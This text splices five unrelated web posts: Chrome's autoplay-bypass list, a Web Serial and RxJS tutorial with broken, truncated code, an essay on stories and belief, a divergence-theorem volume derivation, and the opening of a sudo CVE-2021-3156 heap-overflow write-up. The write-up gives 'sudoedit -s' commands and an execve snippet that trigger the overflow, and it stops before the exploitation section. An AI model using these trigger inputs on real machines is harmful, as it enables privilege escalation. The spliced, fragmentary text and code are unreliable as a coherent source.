<p>You can also use the Chromium code search to find out how these feature flags are actually used.  Searching again for our flag, we can also see the file <a href="https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/media/media_engagement_contents_observer.cc;l=594?q=PreloadMediaEngagementData&amp;ss=chromium" target="_blank" rel="noreferrer noopener">media_engagement_contents_observer.cc</a>, which has all of the logic for the MEI features and exactly how and when these flags are used!</p>



<p>If things change in the future, check back on these two files to see if they’ve added more features or logic you need to disable.</p>



<h3>What is up with the Preload List?  Porn gets to bypass autoplay?  Really?</h3>



<p>From the Chromium code search, we searched for <em>PreloadMediaEngagementData</em> and found <a href="https://source.chromium.org/chromium/chromium/src/+/master:chrome/browser/media/media_engagement_contents_observer.cc;l=601?q=PreloadMediaEngagementData&amp;ss=chromium" target="_blank" rel="noreferrer noopener">where it loads the list of sites</a> that get to bypass autoplay.  It’s coming from a protobuf file called preloaded_data.pb which you can find in your Chrome application folder.  On our test machine (version 88), this was at:  </p>



<pre><code>C:\Program Files\Google\Chrome\Application\88.0.4324.104\MEIPreload\preloaded_data.pb </code></pre>



<p>Protobuf is a binary data encoding from Google, so you can’t just read it.  Being lazy, we just searched Github for <em>preloaded_data.pb</em>, and found <a rel="noreferrer noopener" href="https://gist.github.com/NeatMonster/e9cdb01441a3cd842e6a20fd5170f071" target="_blank">this nice Python script </a>, courtesy of <a href="https://github.com/NeatMonster" target="_blank" rel="noreferrer noopener">NeatMonster</a>, to decode this file to plain text (<a rel="noreferrer noopener" href="https://gist.github.com/awgh/fb62a7e880b56d4c1007def320259060" target="_blank">mirror</a>).</p>



<p>Included in that gist is the list of preloaded list of sites that can bypass autoplay, and you can see sites like pornhub and xhamster in there, among a bunch of other questionable sites for this privilege.</p>



<p>But again, don’t take our word for it, you can run this yourself.  Copy your preloaded_data.pb file out of the Chrome folder and into a temporary folder (or Downloads, etc.), save the <em><strong><a href="https://gist.githubusercontent.com/awgh/fb62a7e880b56d4c1007def320259060/raw/ceb21caf0373a58b09ab63d10edbe306657a7766/unpack_dafsa.py" target="_blank" rel="noreferrer noopener">unpack_dafsa.py</a></strong></em> file to the same folder, and run it from the command line (requires Python):</p>



<pre><code>python unpack_dafsa.py</code></pre>



<p>That will spit out the current contents of the autoplay bypass list for your installed version of Chrome. </p>



<p>Not exactly a list of sites you want to have just blast audio without your explicit permission, is it?</p>

<p>Version 89 of Chrome and Edge browsers have released the <a href="https://reillyeon.github.io/serial/" target="_blank">Web Serial API</a>
 unflagged
which means as user it’s now available for general use rather than being locked behind experimental flags (if you’re
on an earlier version you can enable <strong>Experimental Web Platform features</strong> in <code>chrome://flags</code>)</p>
<p>The API allows for communication between the browser and supported serial hardware such
as <a href="https://www.arduino.cc/" target="_blank">Arduino</a>
 or <a href="https://www.raspberrypi.org/" target="_blank">RaspberryPi</a>
 over USB Serial connection - the
device registers as available to the browser and a port can be opened.</p>
<p>If you don’t have any hardware to connect to, you can easily test it using a Bluetooth Serial connection - provided your
computer has a Bluetooth module you can connect your mobile device to it and use the appropriate software.</p>

<h2 id="connecting-browser-to-hardware">Connecting Browser to Hardware</h2>
<p>To request access to a device, a call needs to be made to the newly available function <code>navigator.serial.requestPort</code>:</p>

  <span>try</span> {
    <span>const</span> <span>port</span> <span>=</span> <span>await</span> <span>navigator</span>.<span>serial</span>.<span>requestPort</span>();
    <span>// We can now access the serial device by opening it
</span><span></span>    <span>// e.g. await port.open({baudRate: 9600})
</span><span></span>  } <span>catch</span> (<span>e</span>) {
    <span>// The prompt has been dismissed without selecting a device.
</span><span></span>  }
});
</code></pre></td></tr></tbody></table>
</div>
</div><p>This function is part of a set that <strong>must</strong> be called from a specific set of user interactions such as <code>touch</code> or
<code>click</code> events - in the demo
after a user gesture such as a button click - you cannot just call <code>requestPort</code> from your code without some kind of
user interaction as this will cause a security violation. You also must call it from a location that does not have
policy set up to disable this (you can see this in the demo above - if you try run it in the editor it won’t work due to
the <code>&lt;iframe&gt;</code> not having the correct policy).</p>
<p>You may also need to install the <a href="https://www.npmjs.com/package/@types/w3c-web-serial" target="_blank">w3c-web-serial types</a>
 in your
project to make sure you have the available types on the <code>navigator</code> object and global types such as <code>SerialPort</code>.</p>
<p>To get a port, call <code>navigator.serial.requestPort</code> inside the handler - it will return a Promise that contains the port
object - you can also wrap it in a <code>try/catch</code> to handle when the user cancels device selection.</p>
<p>The port object once created must be called with the <code>open</code> method - the only required property of the options is the
<code>baudRate</code> which is the maximum bits-per-second transferred but there
are <a href="https://reillyeon.github.io/serial/#open-method" target="_blank">other options</a>
 based on the requirements of the device.</p>
<p>Once opened the port can return a <a href="https://developer.mozilla.org/en-US/docs/Web/API/ReadableStream" target="_blank">ReadableStream</a>

and <a href="https://developer.mozilla.org/en-US/docs/Web/API/WritableStream" target="_blank">WritableStream</a>
 which allows data to be passed to
and from the device.</p>
<h2 id="our-rxjs-operator">Our RxJS Operator</h2>
<p>To turn this into an RxJS operator we’ll consume the port and set up the functionality to both read and write to the
serial bus. You
can <a href="https://github.com/rxjs-ninja/rxjs-ninja/blob/main/libs/rxjs/utility/src/lib/from-web-serial.ts" target="_blank">read the full source code</a>

to see how the final Observable was created, but we’ll cover the important sections below.</p>
<h2 id="reading-from-the-serial-bus">Reading from the Serial Bus</h2>
<p>Once connected, the serial device can start sending data to us - as it’s a <code>ReadableStream</code> the result will be
a <code>UInt8Array</code>.</p>
<p>Here we’ll set up an iterable reader for our stream - while the result is not <code>done</code> and the port is still readable,
we’ll continue to read the source and emit it to the subscriber of the Observable. If the reader has completed, or the
port has been closed we’ll end this iteration.</p>

</div><p>As the output of our Observable is a <code>Uint8Array</code>. Depending on your needs you can decode this to the format you need,
but in most cases it will be text content - here we can use
a <a href="https://developer.mozilla.org/en-US/docs/Web/API/TextDecoder" target="_blank">TextDecoder</a>

  })
).<span>subscribe</span>()
</code></pre></td></tr></tbody></table>
</div>
</div><h2 id="writing-to-the-serial-bus">Writing to the Serial Bus</h2>
<p>The API also allows for writing data to the device, here we can use another <code>Observable</code> that emits a string and provide
it to our function as a source, then we can hook it up to the ports <code>WritableStream</code>.</p>
<p>Instead of directly writing, we will create
a <a href="https://developer.mozilla.org/en-US/docs/Web/API/TransformStream" target="_blank">TextEncoderStream</a>
 - this allows us to create a new
internal writer that we have more control over - it contains both a reader and writer we use this to connect our
sources.</p>
<p>The reader from our encoder will be piped to the ports <code>WritableStream</code>, and the writer passed
to <a href="https://github.com/rxjs-ninja/rxjs-ninja/blob/main/libs/rxjs/utility/src/lib/to-writable-stream.ts" target="_blank">toWritableStream</a>

which connects the <code>Observable</code> to the writer:</p>

</div><p>Now we can pass the <code>Observable</code> and use it to emit our values:</p>

<p>Now we can read from, and write to, our hardware device
the <a href="https://github.com/svendahlstrand/web-serial-api" target="_blank">possibilities are endless</a>
 with what we can do - provided the
hardware supports it.</p>
<p>For this tutorial I build a <a href="https://rxjs-from-web-serial.stackblitz.io/" target="_blank">very basic chat app</a>
 - using the Bluetooth
Serial applications mentioned above you can use it to send and receive text data between devices.</p>
<p><img src="https://tane.dev/images/web-serial-mobile.jpg" alt="A screenshot of a web serial mobile app">
<img src="https://tane.dev/images/web-serial-browser.png" alt="A screenshot of a web serial browser app"></p>
<p>In the <a href="https://stackblitz.com/edit/rxjs-from-web-serial?file=index.ts" target="_blank">example code</a>
 I’ve set up a button to enable
our port request - you should see a popup with a list of devices available for you to use. After connecting
a basic chat interface will show up - type in some text and check out your device software - you should see the same
message there, and you can then send a message back to the browser.</p>
<p>Hopefully you’ve found this tutorial useful and if you do build something with this I’d love to hear about it!</p>

<p><a href="https://rxjs.ninja/" target="_blank">RxJS Ninja</a>
 - is a collection of over 130 operators for working with various types of data (such
as <a href="https://rxjs.ninja/modules/array.html" target="_blank">arrays</a>
, <a href="https://rxjs.ninja/modules/number.html" target="_blank">numbers</a>
) and
<a href="https://rxjs.ninja/modules/utility.html#Streams" target="_blank">streams</a>
 allowing for modifying, filtering and querying the data.</p>
<p>Still in active development, you might find useful operators that provide clearer intent for your RxJS code.</p>

    <p>Stories, not people, rule our world. We’re always telling ourselves a story about how the world works, and this makes stories very powerful.</p>

<p>For example, consider this story:</p>

<blockquote>
  <div><p>An American couple crash their car, die, and ascend to Heaven. God meets them, and they ask “What were the real results of the 2020 election, and who was behind the fraud?”
</p><p>
God says, “There was no fraud, my children. Biden won fair and square.” After a few seconds of stunned silence, the husband turns to the wife and whispers, “This goes higher up than we thought.”</p></div>
</blockquote>

<p>Why does the couple’s political belief supercede God?</p>

<p>Somewhere down the line, what was an entertaining story became something people believed in. This matters because the stories we tell ourselves change how we view the world.</p>

<p>The unreasonable impact of stories confused me. How can a story have so much power?! For the past year, I’ve explored this question, and stumbled upon some surprising connections.</p>

<p>This post explores these connections and what they mean for you: from how stories create beliefs, to lessons from master storytellers about what to be wary of, ending with four powerful stories that have shaped humanity.</p>

<p>Along the way, we’ll also figure out why our couple in Heaven think as they do.</p>

<h2 id="the-belief-hypothesis-spectrum-of-stories">The Belief-Hypothesis Spectrum of Stories</h2>

<p>Consider two stories. Story One is about the economy - how we’re doing great, or not so great, this year. Story Two is about Alice, a rabbit, and a rabbithole.</p>

<p>Which story are you more likely to believe?</p>

<p>Ask young kids, and they’ll probably connect with Alice and the rabbit. The economy? That’s too abstract - sounds like someone created it out of thin air.</p>

<p>While you might believe the story of the economy more, little kids might believe the story of Alice in Wonderland more.</p>

<p>So, we believe in some stories more than others. This degree of belief changes the nature of stories so much so that each kind of story has its own name:</p>

<ul>
  <li>Stories we believe in are beliefs</li>
  <li>Stories we don’t believe in are lies, or fiction</li>
  <li>Stories we’re not sure about are hypotheses</li>
</ul>

<p>An interesting question to ask here is ‘How do we start believing in stories? How does a story move from fiction to belief?’</p>

<p>Everything starts as a story created by someone. Some call it fiction, others call it lies, some others call it belief, and a small minority calls it a hypothesis.</p>

<p>For many of us, an oft-repeated story, spoken by people we love or admire, becomes a belief.</p>

<p>However, a small minority believes a different story. Their story says not to believe any story just because someone we love or admire said it. Evidence reigns supreme. This is the story of science and rationality.</p>

<p>Sometimes, stories materialise a little too easily. If a boss is scolding an employee, others can make up stories - hypotheses - about why this might be the case. When they finally hear from the employee, some, or maybe all stories become false, and the current story, as told by the employee, becomes the leading belief.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>The most common way of creating new stories though, is using templates we’ve heard before. More familiar stories give us more confidence in what’s going on.</p>

<p>For example, in the above example, consider three colleagues making up the story of what happened.</p>

<ul>
  <li>Colleague 1: “He talked to aliens without reporting them”</li>
  <li>Colleague 2: “He banged the bosses’ wife”</li>
  <li>Colleague 3: “He made a mistake on the report”.</li>
</ul>

<p>The first colleague’s story is wildly imaginative (and hard for us to take seriously), while the second and third  are templates we’ve seen before. Given the boss isn’t going bat-shit crazy, it’s probably the second colleague’s story, and not the third’s.</p>

<p>Stories might have seemed invisible beforehand, but they’re our primary sense-making tool to understand the world.</p>

<h2 id="mental-models-are-stories">Mental Models are Stories</h2>

<p><a href="https://neilkakkar.com/A-Simplistic-explanation-to-Mental-Models.html">Mental models</a> are frameworks and heuristics that help explain the world. Sound familiar? They are stories we repeatedly tell ourselves.</p>

<p>This gives a second dimension to stories. If the X axis is degree of belief, the Y axis is degree of explaining-power.</p>

<p>Remember how we prefer stories we’ve heard before, fitting them into templates? The templates are our mental models. They are things we’ve seen happen.</p>

<p>All models are necessarily a simplification of real life - the map isn’t the territory, which means you lose some information when you create the model. The quality of the model depends on what kind of information you lose.</p>

<p>If a map of roads in your country removes all information about trees and their varieties, you’ll probably still find the map useful. However, if you’re a forester, this map is all but useless for you.</p>

<p>Hence, all models are wrong, yet some remain useful.</p>

<p>Stories are also a simplification of real life. Further, simple stories are easy to tell, easy to understand, and easy to spread. Complicated stories don’t go too far.</p>

<p>Bill Gates, on the story of his success, echoes the same sentiment:</p>

<blockquote>
  <p>“Steve [Jobs] and I will always get more credit than we deserve, because otherwise the story gets too complicated.”</p>
</blockquote>

<p>Remember our couple in Heaven contesting the election results? They have a single story in their mind with no room for alternatives: The elections were rigged. They don’t have a story to help them test out new stories. They stick to their own story, until they find a new more powerful story to replace it.</p>

<p>Since mental models are stories, meta-mental models apply to stories too. This leads to interesting implications.</p>

<p>For example, a famous meta-mental model goes: “to the man with a hammer, everything looks like a nail.” Applied to stories, “to a man with a single story, everything fits into the same story.”</p>

<p>What can our couple in Heaven do about this?</p>

<p>The above example hints at another interesting implication: we can use stories to counteract other stories.</p>

<p>Cognitive biases are stories about human psychology. In the face of pressure, poor mental hygiene, or a great sounding story, we end up making catastrophic mistakes.</p>

<p>For example, availability bias is a story professing that what comes to mind first is usually not the complete picture.</p>

<p>This story is counteracting other stories.</p>

<p>It’s  fighting simple stories that are top of mind. It’s a story telling you to beware of stories that have been designed to be so simple (and thus necessarily wrong) that they stay on top of your mind.</p>

<p>If the biases are cancer, learning the story to beware of them is chemotherapy.</p>

<h2 id="stories-are-a-vehicle-for-change">Stories are a Vehicle for Change</h2>

<p>A big question we haven’t yet touched upon is ‘Why do we tell stories?’</p>

<p>Stories move people. A story that moves us, compels us to change. It may not be enough to effect change, but it’s a necessary ingredient.</p>

<p>For example, people donate more to charity when they hear a story about one death, instead of a statistic about how many people died.</p>

<blockquote>
  <p>“A single death is a tragedy; a million deaths is a statistic.” - <a href="https://en.wikipedia.org/wiki/Identifiable_victim_effect" target="_blank" rel="noopener">Identifiable Victim Effect</a></p>
</blockquote>

<p>Telling new stories isn’t just for generating new hypotheses, but for eventually changing your mind, and forming new beliefs.</p>

<p>This third dimension of stories is how effective they are at driving action.</p>

<p>Because of this potency, advertising leads with stories instead of raw facts.</p>

<p>Not just advertisers - news channels do this too. A lot of news is telling new stories for you to believe. Depending on the news channel, there can be zero, or a lot of evidence supporting their stories. And, without a story to counteract these stories, you’ll either believe what they’re saying, without checking the evidence, or completely discard it, based on who is telling the story.</p>

<p>That’s exactly why kids believe everything they’re told when they’re small. They haven’t learned a story that says “Judge for yourself what is true - other people often tell lies to further their own agendas.”</p>

<p>There are three ways to counteract a new story that we’ve already seen:</p>

<ol>
  <li>The Story of Science - the hunt for evidence</li>
  <li>The power of believing in only a single story - or the man with a hammer</li>
  <li>Learning about cognitive biases</li>
</ol>

<blockquote>
  <p>The most effective statisticians are the ones who aren’t afraid to tell a story.  - <a href="https://seths.blog/2019/04/an-anecdote-and-a-statistical-analysis-walk-into-a-bar/" target="_blank" rel="noopener">Seth Godin</a></p>
</blockquote>

<p>The third meta-story has lots of heuristics, and lots of literature to explore.</p>

<p>Specific to advertisers, salesmen, and news channels telling you a story, one good way to counter their story is learning why you’re being told a story. If the storyteller has something to gain, and they’re a master storyteller, they’ll be able to move you to action quickly. Beware their motives for telling you a story.</p>

<p>All the warnings aside, if you can harness this power yourself - you can tell yourself compelling stories - then you can effect change in yourself. That’s something we’ll explore soon, too.</p>

<h2 id="stories-create-blindspots">Stories Create Blindspots</h2>

<p>Just like how all models are wrong, and some are useful; all stories are wrong, some are useful. It’s very easy to make useless stories sound useful.</p>

<p>For example, <a href="https://seths.blog/2020/07/our-top-story/" target="_blank" rel="noopener">Seth Godin</a> says:</p>

<blockquote>
  <p>When you talk about your last job, your last vacation, the things that happened when you were 12…<br>
What do you lead with?<br>
Do you lead with, “I broke my ankle that summer and rarely got out” or is it, “I stuck with my reading regimen and read all of Shakespeare.”<br>
Because both are true.<br>
The top story is the one that informs our narrative, and our narrative changes our future.</p>
</blockquote>

<p>A story is a lens that is prone to framing: how you frame the story changes its focus. This creates blindspots.</p>

<p>Stories are never going to be the …</p></div></div>

<p>The following presents a fast algorithm for volume computation of a simple, closed, triangulated 3D mesh. This assumption is a consequence of the divergence theorem. Further extensions may generalise to other meshes as well, although that is presently out of scope.</p>
<p>We begin with the definition of volume as the triple integral over a region of the constant one:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mo>∭</mo><mi>R</mi></msub><mn>1</mn><mstyle mathvariant="normal"><mi>d</mi></mstyle><mi>V</mi></mrow><annotation encoding="application/x-tex">V = \iiint_R 1 \mathrm{d}V</annotation></semantics></math></p>
<p>Let <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><annotation encoding="application/x-tex">\mathbf{F}</annotation></semantics></math> be a function in <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msup><mstyle mathvariant="double-struck"><mi>ℝ</mi></mstyle><mn>3</mn></msup><annotation encoding="application/x-tex">\mathbb{R}^3</annotation></semantics></math> such that its divergence is equal to one. For the purposes of this paper, we choose:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mo>&lt;</mo><mi>x</mi><mo>,</mo><mn>0</mn><mo>,</mo><mn>0</mn><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">\mathbf{F}(x, y, z) = &lt;x, 0, 0&gt;</annotation></semantics></math></p>
<p>It can easily be verified that</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="normal"><mi>d</mi><mi>i</mi><mi>v</mi></mstyle><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo>=</mo><mfrac><mrow><mi>∂</mi><mi>F</mi></mrow><mrow><mi>∂</mi><mi>x</mi></mrow></mfrac><mo>+</mo><mfrac><mrow><mi>∂</mi><mi>F</mi></mrow><mrow><mi>∂</mi><mi>y</mi></mrow></mfrac><mo>+</mo><mfrac><mrow><mi>∂</mi><mi>F</mi></mrow><mrow><mi>∂</mi><mi>z</mi></mrow></mfrac><mo>=</mo><mn>1</mn><mo>+</mo><mn>0</mn><mo>+</mo><mn>0</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\mathrm{div} \mathbf{F} = \frac{\partial F}{\partial x} + \frac{\partial F}{\partial y} + \frac{\partial F}{\partial z} = 1 + 0 + 0 = 1</annotation></semantics></math></p>
<p>Therefore,</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mo>∭</mo><mi>R</mi></msub><mn>1</mn><mi>d</mi><mi>V</mi><mo>=</mo><msub><mo>∭</mo><mi>R</mi></msub><mstyle mathvariant="normal"><mi>d</mi><mi>i</mi><mi>v</mi></mstyle><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mstyle mathvariant="normal"><mi>d</mi></mstyle><mi>V</mi></mrow><annotation encoding="application/x-tex">V = \iiint_R 1 dV = \iiint_R \mathrm{div} \mathbf{F}(x, y, z) \mathrm{d}V</annotation></semantics></math></p>
<p>By the Divergence Theorem, this is equal to the surface integral:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mo>∬</mo><mi>S</mi></msub><mstyle mathvariant="bold"><mi>𝐅</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>x</mi><mo>,</mo><mi>y</mi><mo>,</mo><mi>z</mi><mo stretchy="false" form="postfix">)</mo><mstyle mathvariant="normal"><mi>d</mi></mstyle><mstyle mathvariant="bold"><mi>𝐒</mi></mstyle></mrow><annotation encoding="application/x-tex">V = \iint_S \mathbf{F}(x, y, z) \mathrm{d}\mathbf{S}</annotation></semantics></math></p>
<p>This surface integral, defined over the surface S of the 3D mesh, is equal to the sum of its piecewise triangle parts.

Each individual triangle <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>T</mi><mi>i</mi></msub><annotation encoding="application/x-tex">T_i</annotation></semantics></math> may thus be parametrised as:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mo stretchy="false" form="prefix">(</mo><mi>u</mi><mo>,</mo><mi>v</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><msub><mi>T</mi><mrow><mi>i</mi><mn>0</mn></mrow></msub><mo>+</mo><mi>u</mi><msub><mi>Δ</mi><mn>1</mn></msub><mo>+</mo><mi>v</mi><msub><mi>Δ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}(u, v) = T_{i0} + u\Delta_1 + v\Delta_2</annotation></semantics></math></p>
<p>Then, simple differentiation yields:</p>
<p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>u</mi></msub><mo>=</mo><msub><mi>Δ</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}_u = \Delta_1</annotation></semantics></math> <math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mstyle mathvariant="bold"><mi>𝐫</mi></mstyle><mi>v</mi></msub><mo>=</mo><msub><mi>Δ</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{r}_v = \Delta_2</annotation></semantics></math></p>
<p>Therefore,</p>

<h2 id="performance-analysis">Performance analysis</h2>
<p>The final algorithm contains no numerical integration nor differentiation. In contrast to common naive algorithms for volume, which are equivalent to rendering the mesh and then sampling the render, an expensive operation, there is only a single loop in this algorithm, over the triangles. Thus, this algorithm for volume computation is O(n) to the number of the triangles. Furthermore, the per-triangle calculation is similarly efficient: given the natural expansion of the cross product, the inner part contains seven additions and three multiplications. On the outside of the loop is only a single multiplication. Thus, for a mesh of <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>n</mi><annotation encoding="application/x-tex">n</annotation></semantics></math> triangles, the algorithm requires <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">8n - 1</annotation></semantics></math> additions and <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">3n + 1</annotation></semantics></math> multiplications, or <math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">11n</annotation></semantics></math> floating point operations. This is <em>very</em> fast.</p>
<p>For a ballpark number, if volume needs to be calculated every frame in a high-performance 60 frames per second application, without the aid of a GPU, only using the CPU capabilities of a <a href="https://raspberrypi.stackexchange.com/questions/55862/what-is-the-performance-and-the-performance-per-watt-of-raspberry-pi-3-in-gflops">$35 Raspberry Pi</a>, around 30 million triangles could be measured every frame.</p>
<h2 id="motivation">Motivation</h2>
<p>The vector calculus exam is soon, and I need to study. Plus, who doesn’t love 3D graphics?!</p>
<p><del>I would be (pleasantly) surprised if the algorithm is novel.</del> Further research <em>after</em> posting reveals the paper <a href="http://chenlab.ece.cornell.edu/Publication/Cha/icip01_Cha.pdf">Efficient Feature Extraction for 2D/3D Objects in Mesh Representation</a> by Cha Zheng and Tsuhan Chen, which appears to describe the same algorithm, although the derivation is different. It was fun while it lasted!</p>

    <h2 id="introduction">Introduction</h2>
<p>On the 2021-01-26 qualy released this <a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">article</a> describing a “new” (actually 10 year old) bug in sudo that allows an attacker to do privilege escalation though a heap buffer overflow.
Unfortunately they did not release exploit/POC so I decided to build one myself and failed. It turned out that Pewz from bootplug had the same thought and our combined forces allowed us to successfully exploit this bug on the newest libc 2.32 in my local arch environment with sudo version 1.9.4p2.</p>
<h2 id="vulnerability">Vulnerability</h2>
<p>I will only briefly cover the vulnerability here as it’s quite well described in the article.</p>
<p>In an essence an attacker can overflow a heap chunk by inserting a single backslash at the end of any argv or env argument given to sudo, causing the following argument to be written out of bound. Let’s look at a simplified version of one of the code snippets from the article.</p>
<div><pre><code data-lang="C"><span>for</span> (size <span>=</span> <span>0</span>, av <span>=</span> NewArgv <span>+</span> <span>1</span>; <span>*</span>av; av<span>++</span>)
  size <span>+=</span> strlen(<span>*</span>av) <span>+</span> <span>1</span>;
...
<span>if</span> (size <span>==</span> <span>0</span> <span>||</span> (user_args <span>=</span> malloc(size)) <span>==</span> NULL) {
  <span>//do some stuff we don't care about
</span><span></span>}
...
<span>for</span> (to <span>=</span> user_args, av <span>=</span> NewArgv <span>+</span> <span>1</span>; (from <span>=</span> <span>*</span>av); av<span>++</span>) {
  <span>while</span> (<span>*</span>from) {
    <span>if</span> (from[<span>0</span>] <span>==</span> <span>'\\'</span> <span>&amp;&amp;</span> <span>!</span>isspace((<span>unsigned</span> <span>char</span>)from[<span>1</span>]))
      from<span>++</span>;
    <span>*</span>to<span>++</span> <span>=</span> <span>*</span>from<span>++</span>;
    }
    <span>*</span>to<span>++</span> <span>=</span> <span>' '</span>;
}
</code></pre></div><p>As we see in the first for loop we are iterating over each argument and finding the size (plus null terminator) of it using <code>strlen</code>. Now lets say we have the string <code>"AAAA\\"</code> (<code>\\</code> is one char).</p>
<p>The size will be 5 and it will only do an allocation of 5 bytes assuming this is the only argument.</p>
<p>In the next part we have a outer for loop over arguments and an inner loop copying the contents of all the arguments into the single buffer, <code>user_args</code>, essentially concatenating all arguments.</p>
<p>Considering the same string as before, <code>"AAAA\\"</code>, when we hit <code>from[0]=='\\'</code> we go into the if and increment <code>from</code> by <code>from++</code>, incrementing <code>from</code> so it points to the null terminator. After that we continue the loop with the next statement <code>*to++ = *from++;</code> copying the null terminator and again incrementing <code>from</code> to continue copying bytes after the null terminator we continue copying out of bounds.</p>
<p>This happens because it expects that every <code>\\</code> is followed by a meta-character, which the authors came up with a clever way of avoiding, leaving this vulnerable to a overflow. Read the article if you want to know why and how we can end up having a single <code>\\</code> in the args when entering this block.</p>
<p>By using the symbolic link <code>sudoedit</code> to <code>sudo</code> we can make this happen:</p>
<p><img src="https://www.kalmarunionen.dk/images/overflow.png" alt="image info"></p>
<h3 id="properties-of-the-overflow">Properties of the overflow</h3>
<p>The authors state 3 important properties about this overflow which make it quite powerful.</p>
<p>First and simplest we control the allocation size of <code>user_args</code> as we chose how many and how long we make the arguments to sudo.</p>
<p>Second we control the contents of the overflowed area.
This we can achieve by using the supplied environment variables. The environment variables is infact stored right after the last argument passed to <code>sudoedit</code> meaning that if we do <code>env -i 'A=BBBB' sudoedit -s 'CCCCCCCCCCCCCCCC'</code> we insert the C’s into the user_args buffer and <code>A=BBBB</code> will follow in the out of bounds area. Be aware that chunk size’s align to sizes of 0x10 so e.g. <code>env -i 'A=BB' sudoedit -s 'CCCCBBBBBBBB'</code> will only fill the buffer.</p>
<p>If you paid close attention to the inner loop in our concatenation block you probably noticed that we can exploit this multiple times. By ending a environment variable with <code>\\</code> we can make another skip to the next environment variable. So why would we like that? Because as the <code>from++</code> increments the pointer to the null terminator on the following <code>to++ = *from++;</code> it will insert that null terminator. This makes us able to insert 0x0 as well without ending the overflow making this overflow extremely powerful.</p>
<p>Example from the authors:</p>
<p><code>env -i 'AA=a\' 'B=b\' 'C=c\' 'D=d\' 'E=e\' 'F=f' sudoedit -s '1234567890123456789012\'</code></p>
<p>This will end up like this in the buffer:</p>
<pre><code>--|--------+--------+--------+--------|--------+--------+--------+--------+--
  |        |        |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.|
--|--------+--------+--------+--------|--------+--------+--------+--------+--
              size  &lt;---- user_args buffer ----&gt;  size      fd       bk
</code></pre><p>So we wont go into what forward (fd) or backwards (bk) pointers of a heap chunk mean as we are only exploiting in use memory.
Super short and oversimplified description:</p>
<ul>
<li>the first size is the size of the following chunk. It is equal to 0x10 + argument given to malloc as we also need space for size itself and alignment/previous size.</li>
<li>the next size is the contiguous chunks size.</li>
<li>fd and bk are pointers to the next and previous chunk respectively in this linked list of freed chunks. This only applies to freed chunks. Otherwise this space is available to the caller of malloc.</li>
</ul>
<p>If you want to know more about this topic I strongly encourage you to read the <a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/">Azeria’s blog about heap exploitation</a>.</p>
<p>Now an important note to make here about the null terminator insertion I think the original paper lacks is that we can insert multiple contiguous null bytes as well.</p>
<p>First thing to understand is that environment variables don’t have to in the form of <code>SOMETHING=something_more</code>. As everything else these are just char arrays and we can do what we can with them in C. as example:</p>
<div><pre><code data-lang="C"><span>char</span> <span>*</span>args[] <span>=</span> { <span>"/usr/bin/sudoedit"</span>, <span>"-s"</span>, <span>"AAAAAAAA"</span>, NULL };
<span>char</span> <span>*</span>env[] <span>=</span> { <span>"BBBBBBBB"</span>, <span>"</span><span>\\</span><span>"</span>, <span>"</span><span>\\</span><span>"</span>, <span>"CCCCCCCC"</span>, NULL };
execve(<span>"/usr/bin/sudoedit"</span>, argv, env);
</code></pre></div><p>Here we are using execve to execute the process with full control of the environment variables.
In the inner for loop we run into the if statement at ´"\\“´ and by that skipping one char by <code>from++</code> the backslash and only inserting the null jumping onto the next ´”\\“´ and consequently inserting two null bytes in a row.</p>
<h2 id="exploitation">Exploitation</h2>
<p>While the authors mention 3 possible targets here in this writeup we will only cover the second one.</p>
<p>Reasons:</p>
<ul>
<li>no brute-force involved in contrast to the first option where they partially overflow a function pointer defeating ASLR with brute-force.</li>
<li>They state that they did it successfully for 3 operating systems where both the other two were only one.</li>
</ul>
